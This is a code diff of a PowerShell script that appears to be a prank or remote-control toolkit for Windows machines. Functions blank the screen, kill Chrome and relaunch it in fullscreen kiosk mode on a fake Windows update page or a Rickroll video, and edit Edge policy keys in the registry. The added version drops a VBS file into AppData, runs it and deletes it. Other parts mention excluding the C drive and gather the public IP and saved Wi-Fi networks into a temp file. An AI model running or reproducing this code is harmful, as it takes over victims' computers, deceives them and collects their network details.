@@ -128,7 +128,7 @@ Write-Output "Uninstalled."
 
 Function KillDisplay {
 
-(Add-Type '[DllImport("user32.dll")]public static extern int SendMessage(int hWnd, int hMsg, int wParam, int lParam);' -Name a -Pas)::SendMessage(-1,0x0112,0xF170,2)
+start-process -path C:\Windows\System32\scrnsave.scr
 Write-Output "Done."
 }
 
@@ -156,23 +156,23 @@ Write-Output "Done."
 }
 
 Function FakeUpdate {
-$tobat = @'
+$tobat2 = @'
 Set WshShell = WScript.CreateObject("WScript.Shell")
 WshShell.Run "C:\Windows\System32\scrnsave.scr"
 WshShell.Run "chrome.exe --new-window -kiosk https://fakeupdate.net/win8", 1, False
 WScript.Sleep 200
 WshShell.SendKeys "{F11}"
 '@
-$pth = "$env:APPDATA\Microsoft\Windows\1031.vbs"
-$tobat | Out-File -FilePath $pth -Force
+$pth2 = "$env:APPDATA\Microsoft\Windows\1031.vbs"
+$tobat2 | Out-File -FilePath $pth2 -Force
 sleep 1
-Start-Process -FilePath $pth
+Start-Process -FilePath $pth2
 sleep 5
 Write-Output "Done."
-Remove-Item -Path $pth -Force
+Remove-Item -Path $pth2 -Force
 }
 
-Function Win93 {
+Function Windows93 {
 $tobat = @'
 Set WshShell = WScript.CreateObject("WScript.Shell")
 WshShell.Run "C:\Windows\System32\scrnsave.scr"
@@ -256,53 +256,21 @@ Write-Output "Excluding C Drive"
 Write-Output "Done."
 }
 
-
 Function Rickroll{
-
-$firstart = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"
-If (Test-Path $firstart) {New-Item $firstart}
-    Set-ItemProperty $firstart HideFirstRunExperience -Value 1
-    cmd.exe ("/c taskkill /F /IM chrome.exe & start chrome.exe -kiosk https://www.youtube.com/watch?v=dQw4w9WgXcQ & exit")
-
-function Do-SendKeys {
-    param (
-        $SENDKEYS,
-        $WINDOWTITLE
-    )
-    $wshell = New-Object -ComObject wscript.shell;
-    IF ($WINDOWTITLE) {$wshell.AppActivate($WINDOWTITLE)}
-    Sleep 1
-    IF ($SENDKEYS) {$wshell.SendKeys($SENDKEYS)}
-}
-
-Sleep 5
-Do-SendKeys -WINDOWTITLE chrome.exe -SENDKEYS ("f")
-
+$tobat = @'
+Set WshShell = WScript.CreateObject("WScript.Shell")
+WshShell.Run "C:\Windows\System32\scrnsave.scr"
+WshShell.Run "chrome.exe --new-window -kiosk https://www.youtube.com/watch?v=dQw4w9WgXcQ", 1, False
+WScript.Sleep 200
+WshShell.SendKeys "{F11}"
+'@
+$pth = "$env:APPDATA\Microsoft\Windows\1021.vbs"
+$tobat | Out-File -FilePath $pth -Force
+sleep 1
+Start-Process -FilePath $pth
+sleep 5
 Write-Output "Done."
-}
-
-
-Function Windows93{
-
-$firstart = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"
-If (Test-Path $firstart) {New-Item $firstart}
-    Set-ItemProperty $firstart HideFirstRunExperience -Value 1
-    cmd.exe ("/c taskkill /F /IM chrome.exe & start chrome.exe -kiosk windows93.net & exit")
-
-
-Write-Output "Done."
-}
-
-
-Function FakeUpdate{
-
-$firstart = "HKEY_LOCAL_MACHINE\SOFTWARE\Policies\Microsoft\Edge"
-If (Test-Path $firstart) {New-Item $firstart}
-    Set-ItemProperty $firstart HideFirstRunExperience -Value 1
-    cmd.exe ("/c taskkill /F /IM chrome.exe & start chrome.exe -kiosk windows93.net & exit")
-
-
-Write-Output "Done."
+Remove-Item -Path $pth -Force
 }
 
 Function ProgramList {
@@ -515,8 +483,8 @@ $outpath = "$env:temp\systeminfo.txt"
 "Public IP          : $computerPubIP" | Out-File -FilePath $outpath -Encoding ASCII -Append
 "Saved Networks     : $outssid" | Out-File -FilePath $outpath -Encoding ASCII -Append
 
-$textfile2 = Get-Content "$env:temp\systeminfo.txt" -Raw
-Write-Output "$textfile2"
+$textfile2 = Get-Content "$env:temp\systeminfo.txt"
+Write-Output $textfile2
 }
 
 Function Send-DadJoke 
